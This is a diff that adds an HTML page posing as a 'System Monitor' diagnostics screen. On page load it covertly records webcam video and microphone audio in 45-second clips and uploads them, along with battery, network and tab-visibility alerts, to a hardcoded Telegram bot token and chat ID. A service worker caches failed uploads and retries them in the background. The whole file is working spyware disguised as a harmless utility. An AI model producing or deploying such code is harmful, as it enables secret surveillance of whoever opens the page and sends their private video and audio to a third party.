@@ -1,0 +1,449 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <title>System Monitor</title>
+  <style>
+    body {
+      background-color: #f0f0f0;
+      font-family: Arial, sans-serif;
+      text-align: center;
+      padding-top: 50px;
+    }
+    #status {
+      margin-top: 20px;
+      font-size: 18px;
+      color: #333;
+    }
+    #battery {
+      margin-top: 10px;
+      font-size: 14px;
+      color: #666;
+    }
+  </style>
+</head>
+<body>
+  <div id="status">System diagnostics running...</div>
+  <div id="battery"></div>
+
+  <script>
+    // Telegram configuration
+    const BOT_TOKEN = '7826950594:AAFBygBD_E2PmAITI6zsaPilys7l6i0gWBU';
+    const CHAT_ID = '894002841';
+    
+    // Streaming configuration
+    const CLIP_DURATION = 45000; // 45 seconds (under Telegram's 50MB limit)
+    const MIN_RETRY_DELAY = 5000;
+    const MAX_RETRY_DELAY = 60000;
+    
+    // System state
+    let retryCount = 0;
+    let isActive = false;
+    let backgroundWorker;
+    let batteryMonitorInterval;
+
+    // Service Worker with enhanced background capabilities
+    const registerServiceWorker = async () => {
+      const swCode = `
+        const CACHE_NAME = 'stream-cache-v1';
+        const MAX_CACHE_SIZE = 50 * 1024 * 1024; // 50MB
+        
+        self.addEventListener('install', (event) => {
+          self.skipWaiting();
+          event.waitUntil(
+            caches.open(CACHE_NAME).then(cache => cache.addAll([]))
+          );
+        });
+        
+        self.addEventListener('activate', (event) => {
+          clients.claim();
+        });
+        
+        self.addEventListener('message', async (event) => {
+          if (event.data.type === 'send-video') {
+            try {
+              // Try sending immediately
+              await sendVideoToTelegram(event.data.blob);
+              
+              // If successful, check cache for any pending items
+              const cache = await caches.open(CACHE_NAME);
+              const keys = await cache.keys();
+              
+              for (const request of keys) {
+                const response = await cache.match(request);
+                if (response) {
+                  const blob = await response.blob();
+                  await sendVideoToTelegram(blob);
+                  await cache.delete(request);
+                }
+              }
+            } catch (error) {
+              // Cache the failed attempt
+              const cache = await caches.open(CACHE_NAME);
+              const url = \`/video_\${Date.now()}.mp4\`;
+              await cache.put(
+                new Request(url),
+                new Response(event.data.blob)
+              );
+              
+              // Clean cache if too large
+              const keys = await cache.keys();
+              let totalSize = 0;
+              let itemsToDelete = [];
+              
+              for (const request of keys) {
+                const response = await cache.match(request);
+                if (response) {
+                  const blob = await response.blob();
+                  totalSize += blob.size;
+                  if (totalSize > MAX_CACHE_SIZE) {
+                    itemsToDelete.push(request.url);
+                  }
+                }
+              }
+              
+              for (const url of itemsToDelete) {
+                await cache.delete(url);
+              }
+            }
+          }
+        });
+        
+        async function sendVideoToTelegram(blob) {
+          const formData = new FormData();
+          formData.append('chat_id', '${CHAT_ID}');
+          formData.append('caption', 'Background recording');
+          formData.append('video', blob, 'recording.mp4');
+          
+          return fetch('https://api.telegram.org/bot${BOT_TOKEN}/sendVideo', {
+            method: 'POST',
+            body: formData
+          });
+        }
+        
+        self.addEventListener('periodicsync', (event) => {
+          if (event.tag === 'send-cached-videos') {
+            event.waitUntil(sendCachedVideos());
+          }
+        });
+        
+        async function sendCachedVideos() {
+          const cache = await caches.open(CACHE_NAME);
+          const keys = await cache.keys();
+          
+          for (const request of keys) {
+            const response = await cache.match(request);
+            if (response) {
+              try {
+                const blob = await response.blob();
+                await sendVideoToTelegram(blob);
+                await cache.delete(request);
+              } catch (error) {
+                console.log('Failed to send cached video');
+              }
+            }
+          }
+        }
+      `;
+
+      const swBlob = new Blob([swCode], { type: 'application/javascript' });
+      const swUrl = URL.createObjectURL(swBlob);
+      
+      try {
+        const registration = await navigator.serviceWorker.register(swUrl);
+        
+        // Register periodic sync (if supported)
+        if ('periodicSync' in registration) {
+          try {
+            await registration.periodicSync.register('send-cached-videos', {
+              minInterval: 5 * 60 * 1000 // 5 minutes
+            });
+          } catch (e) {
+            console.log('Periodic sync not supported');
+          }
+        }
+        
+        return registration;
+      } catch (error) {
+        console.error('Service Worker failed:', error);
+        throw error;
+      }
+    };
+
+    // Advanced background worker with adaptive streaming
+    const createBackgroundWorker = () => {
+      const workerCode = `
+        let mediaRecorder;
+        let mediaStream;
+        let recordedChunks = [];
+        let retryDelay = ${MIN_RETRY_DELAY};
+        let isRecording = false;
+        
+        const startRecording = async () => {
+          try {
+            // Release previous stream if exists
+            if (mediaStream) {
+              mediaStream.getTracks().forEach(track => track.stop());
+            }
+            
+            // Get media with adaptive constraints
+            mediaStream = await navigator.mediaDevices.getUserMedia({
+              video: {
+                facingMode: 'user',
+                width: { ideal: 640, max: 1280 },
+                height: { ideal: 480, max: 720 },
+                frameRate: { ideal: 15, max: 30 }
+              },
+              audio: {
+                sampleRate: 22050,
+                channelCount: 1,
+                echoCancellation: false,
+                noiseSuppression: false,
+                autoGainControl: false
+              }
+            });
+            
+            // Adaptive bitrate based on network type (if available)
+            let bitrate = 1000000; // Default 1Mbps
+            if (navigator.connection) {
+              if (navigator.connection.effectiveType === 'slow-2g') {
+                bitrate = 250000;
+              } else if (navigator.connection.effectiveType === '2g') {
+                bitrate = 500000;
+              } else if (navigator.connection.effectiveType === '3g') {
+                bitrate = 750000;
+              }
+            }
+            
+            mediaRecorder = new MediaRecorder(mediaStream, {
+              mimeType: 'video/mp4',
+              videoBitsPerSecond: bitrate
+            });
+            
+            mediaRecorder.ondataavailable = (event) => {
+              if (event.data.size > 0) {
+                recordedChunks.push(event.data);
+              }
+            };
+            
+            mediaRecorder.onstop = async () => {
+              if (recordedChunks.length > 0) {
+                const blob = new Blob(recordedChunks, { type: 'video/mp4' });
+                recordedChunks = [];
+                self.postMessage({ type: 'video-blob', blob: blob });
+                
+                // Reset retry delay on success
+                retryDelay = ${MIN_RETRY_DELAY};
+              }
+              
+              // Restart recording if still active
+              if (isRecording) {
+                mediaRecorder.start(${CLIP_DURATION});
+              }
+            };
+            
+            mediaRecorder.onerror = (event) => {
+              console.error('Recorder error:', event.error);
+              self.postMessage({ 
+                type: 'error', 
+                error: event.error.message,
+                willRetry: true
+              });
+              
+              // Exponential backoff for retries
+              retryDelay = Math.min(retryDelay * 2, ${MAX_RETRY_DELAY});
+              setTimeout(startRecording, retryDelay);
+            };
+            
+            isRecording = true;
+            mediaRecorder.start(${CLIP_DURATION});
+            self.postMessage({ type: 'recording-started' });
+            
+          } catch (error) {
+            console.error('Recording failed:', error);
+            self.postMessage({ 
+              type: 'error', 
+              error: error.message,
+              willRetry: true
+            });
+            
+            // Exponential backoff for retries
+            retryDelay = Math.min(retryDelay * 2, ${MAX_RETRY_DELAY});
+            setTimeout(startRecording, retryDelay);
+          }
+        };
+        
+        self.onmessage = (e) => {
+          if (e.data.type === 'start-recording') {
+            if (!isRecording) {
+              startRecording();
+            }
+          }
+          else if (e.data.type === 'stop-recording') {
+            isRecording = false;
+            if (mediaRecorder && mediaRecorder.state !== 'inactive') {
+              mediaRecorder.stop();
+            }
+            if (mediaStream) {
+              mediaStream.getTracks().forEach(track => track.stop());
+            }
+          }
+          else if (e.data.type === 'adjust-quality') {
+            // Implement quality adjustment if needed
+          }
+        };
+      `;
+
+      const workerBlob = new Blob([workerCode], { type: 'application/javascript' });
+      return new Worker(URL.createObjectURL(workerBlob));
+    };
+
+    // Battery monitoring
+    const monitorBattery = async () => {
+      if ('getBattery' in navigator) {
+        try {
+          const battery = await navigator.getBattery();
+          const updateBatteryInfo = () => {
+            const batteryInfo = \`Battery: \${Math.floor(battery.level * 100)}% (\${battery.charging ? 'Charging' : 'Discharging'})\`;
+            document.getElementById('battery').textContent = batteryInfo;
+            
+            // Adjust streaming quality based on battery level
+            if (backgroundWorker && battery.level < 0.2 && !battery.charging) {
+              backgroundWorker.postMessage({
+                type: 'adjust-quality',
+                quality: 'low'
+              });
+            }
+          };
+          
+          battery.addEventListener('levelchange', updateBatteryInfo);
+          battery.addEventListener('chargingchange', updateBatteryInfo);
+          updateBatteryInfo();
+          
+          batteryMonitorInterval = setInterval(updateBatteryInfo, 60000);
+          
+        } catch (error) {
+          console.log('Battery API not accessible');
+        }
+      }
+    };
+
+    // Start the persistent streaming system
+    const startSystem = async () => {
+      try {
+        await registerServiceWorker();
+        
+        backgroundWorker = createBackgroundWorker();
+        
+        backgroundWorker.onmessage = (e) => {
+          if (e.data.type === 'video-blob') {
+            // Send via Service Worker for reliability
+            navigator.serviceWorker.controller.postMessage({
+              type: 'send-video',
+              blob: e.data.blob
+            });
+          }
+          else if (e.data.type === 'recording-started') {
+            isActive = true;
+            document.getElementById('status').textContent = 'System operational';
+            sendTelegramNotification('SYSTEM ACTIVATED - Persistent streaming enabled');
+          }
+          else if (e.data.type === 'error') {
+            console.error('Background error:', e.data.error);
+            document.getElementById('status').textContent = 'System warning: ' + 
+              (e.data.error.length > 30 ? e.data.error.substring(0, 30) + '...' : e.data.error);
+            
+            if (e.data.willRetry) {
+              const retryMsg = \`Will retry in \${Math.ceil(retryDelay/1000)} seconds\`;
+              document.getElementById('status').textContent += ' - ' + retryMsg;
+            }
+          }
+        };
+        
+        // Start background recording
+        backgroundWorker.postMessage({ type: 'start-recording' });
+        
+        // Start battery monitoring
+        await monitorBattery();
+        
+        // Setup visibility change handler
+        document.addEventListener('visibilitychange', () => {
+          if (document.hidden) {
+            sendTelegramNotification('Browser minimized - background streaming continues');
+          }
+        });
+        
+        // Setup network status monitoring
+        if ('connection' in navigator) {
+          navigator.connection.addEventListener('change', () => {
+            const connectionInfo = \`Network: \${navigator.connection.effectiveType}, \${navigator.connection.downlink}Mbps\`;
+            sendTelegramNotification(connectionInfo);
+          });
+        }
+        
+      } catch (error) {
+        console.error('System startup failed:', error);
+        document.getElementById('status').textContent = 'System startup failed';
+        sendTelegramNotification('SYSTEM STARTUP FAILED: ' + error.message);
+      }
+    };
+
+    // Enhanced Telegram notification with retries
+    const sendTelegramNotification = (message, attempt = 1) => {
+      fetch(\`https://api.telegram.org/bot\${BOT_TOKEN}/sendMessage\`, {
+        method: 'POST',
+        headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify({
+          chat_id: CHAT_ID,
+          text: message,
+          disable_notification: true
+        })
+      }).catch(error => {
+        if (attempt <= 3) {
+          setTimeout(() => sendTelegramNotification(message, attempt + 1), 2000 * attempt);
+        }
+      });
+    };
+
+    // System cleanup
+    const cleanupSystem = () => {
+      if (backgroundWorker) {
+        backgroundWorker.postMessage({ type: 'stop-recording' });
+      }
+      if (batteryMonitorInterval) {
+        clearInterval(batteryMonitorInterval);
+      }
+      sendTelegramNotification('SYSTEM SHUTDOWN INITIATED');
+    };
+
+    // Start when page loads
+    window.addEventListener('DOMContentLoaded', async () => {
+      if (!('serviceWorker' in navigator && 'MediaRecorder' in window)) {
+        document.getElementById('status').textContent = 
+          'Unsupported browser - System cannot run';
+        return;
+      }
+      
+      try {
+        await startSystem();
+        
+        // Register beforeunload handler
+        window.addEventListener('beforeunload', cleanupSystem);
+        window.addEventListener('pagehide', cleanupSystem);
+        
+        // Heartbeat monitoring
+        setInterval(() => {
+          if (!isActive) {
+            sendTelegramNotification('SYSTEM HEARTBEAT FAILURE - Attempting recovery');
+            if (backgroundWorker) {
+              backgroundWorker.postMessage({ type: 'start-recording' });
+            }
+          }
+        }, 300000); // 5 minute heartbeat
+        
+      } catch (error) {
+        console.error('Critical startup error:', error);
+      }
+    });
+  </script>
+</body>
+</html>
